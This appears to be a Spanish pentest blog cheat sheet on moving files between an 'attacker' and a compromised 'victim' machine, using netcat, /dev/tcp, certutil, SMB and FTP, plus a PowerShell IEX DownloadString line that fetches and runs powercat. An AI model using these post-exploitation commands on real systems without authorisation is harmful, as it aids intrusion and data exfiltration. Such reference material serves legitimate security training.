---
title: "Transfer Files - Cheat Sheet"
tags: ["Cheat Sheet"]
categories: ["Read Team"] 
cover:
    image: "/TransferFiles/TransferFiles.jpg"
    # can also paste direct link from external site
    #ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

# Tranferencia de Ficheros - Cheat Sheet

> ¡Bienvenidos a esta cheat sheet sobre los distintos métodos para la transferencia de archivos entre una máquina "atacante" y una máquina "víctima"! 
>
> Cuando se consigue acceso a una máquina de forma remota, la capacidad de transferir archivos de manera efectiva es esencial. Esta guía proporciona una visión general de diversos métodos utilizados .


## Linux
### HTTP Server
```bash
# Emisor
python -m SimpleHTTPServer 80

# Receptor
wget http://192.168.1.1/ArchivoTransferir
o
curl -o ArchivoTransferir http://192.168.1.130/ArchivoTransferir
```
### SCP (utilidad de SSH)
**Subir fichero:**
```bash
scp ArchivoTransferir user@192.168.1.1:/home/user/
```
**Descargar fichero:**
```bash
scp user@192.168.1.1:/home/user/ArchivoDescargar .
```
### Netcat
```bash
# Emisor
nc -lvp 4444 > ArchivoTransferir

# Receptor
nc 192.168.1.1 4444 -w 3 < ArchivoTransferir
```
### FTP
```bash
# Emisor
twistd -n ftp -r .

# Receptor
wget ftp://192.168.1.1:21/ArchivoTransferir
```
### Máquina objetivo no tiene nada instalado I
```bash
# Emisor
nc -nlvp 4444 < ArchivoTransferir

# Receptor
cat > ArchivoTransferir < /dev/tcp/192.168.1.1/4444
```

### Máquina objetivo no tiene nada instalado II
Pasar el fichero a base64
```bash
base64 -w 0 ArchivoTransferir
```
Copiar el contenido de ese output al portapapeles
```bash
base64 -w 0 ArchivoTransferir | xclip -sel clip
```
En la máquina donde queremos pasar el fichero, hacemos `echo` a la cadena del portapapeles, la decodificamos de base64 y la volcamos a un fichero.
```bash
echo "IyEvYmluL2Jhc2gKCiMgUmFuZ29zIGRlIHJlZCBhIGVzY2FuZWFyCmhvc3RzPSgiMTcyLjE4LjAiICIxNzIuMTkuMCIpCgpmb3IgaG9zdCBpbiAke2hvc3RzW0BdfTsgZG8KICAgIGVjaG8gLWUgIlxuWytdIEVudW1lcmF0aW5nICRob3N0LjAvMjRcbiIKICAgIGZvciBpIGluICQoc2VxIDEgMjU0KTsgZG8KICAgICAgICB0aW1lb3V0IDEgYmFzaCAtYyAicGluZyAtYyAxICRob3N0LiRpIiAmPiAvZGV2L251bGwgJiYgZWNobyAiWytdIEhvc3QgJGhvc3QuJGkgLSBBQ1RJVkUiICYKICAgIGRvbmU7IHdhaXQKZG9uZQ==" | base64 -d > ArchivoTransferir
```
## Windows
### HTTP Server
#### DownloadFile # Subir fichero
```bash
# Emisor:
python -m SimpleHTTPServer 80

# Receptor:
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.1:80/ArchivoTransferir','C:\Users\test\Desktop\ArchivoTransferir')"
```
#### iwr / wget # Subir fichero
```bash
# Emisor:
python -m SimpleHTTPServer 80

# Receptor:
iwr -uri http://192.168.1.1:80/ArchivoTransferir -Outfile ArchivoTransferir
o
wget http://192.168.1.1:80/ArchivoTransferir -Outfile ArchivoTransferir
```
#### Cetutil # Subir fichero
```bash
# Emisor:
python -m SimpleHTTPServer 80

# Receptor:
certutil.exe -urlcache -split -f http://192.168.1.1:80/ArchivoTransferir ArchivoTransferir
```
#### Powercat # Bajar fichero
```bash
# Receptor aloja powercat.ps
python -m SimpleHTTPServer 80

# Emisor descarga de Receptor powercat.ps1 y levanta un servidor HTTP con el fichero a tranferir:
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\ArchivoTransferir"

# Receptor descarga del servidor HTTP levantado con Powercat el archivo a tranferir:
wget http://192.168.1.1:4444/ArchivoTransferir
```
### Netcat
```bash
# Emisor:
nc.exe -lvp 4444 > ArchivoTransferir
nc -lvp 4444 > ArchivoTransferir

# Receptor:
nc 192.168.1.1 4444 -w 3 < ArchivoTransferir
nc.exe 192.168.1.1 4444 -w 3 < ArchivoTransferir
```
### FTP
#### Subir archivos FTP
```bash
# Receptor:
twistd -n ftp -r .

# Emisor:
ftp
open 192.168.1.1 2121
anonymous
 
get ArchivoTransferir
bye
```
#### Bajar archivos FTP
```bash
# Receptor:
python -m pyftpdlib -w

# Emisor:
ftp
open 192.168.1.1 2121
anonymous
 
put ArchivoTransferir
bye
```
### SMB
#### Subir archivos SMB
```bash
# Emisor:
impacket-smbserver -smb2support test .

# Receptor:
copy \\192.168.1.1\test\ArchivoTransferir ArchivoTransferir
## Para copiar carpetas con su contenido de forma recursiva sin perder nada
robocopy \\192.168.1.1\test\ArchivoTransferir ArchivoTransferir /E /COPYALL
```
#### Bajar archivos SMB
```bash
# Emisor:
impacket-smbserver -smb2support test .

# Receptor:
copy ArchivoTransferir \\192.168.1.1\test\ArchivoTransferir 
## Para copiar carpetas con su contenido de forma recursiva sin perder nada
robocopy ArchivoTransferir \\192.168.1.1\test\ArchivoTransferir /E /COPYALL
```



* **

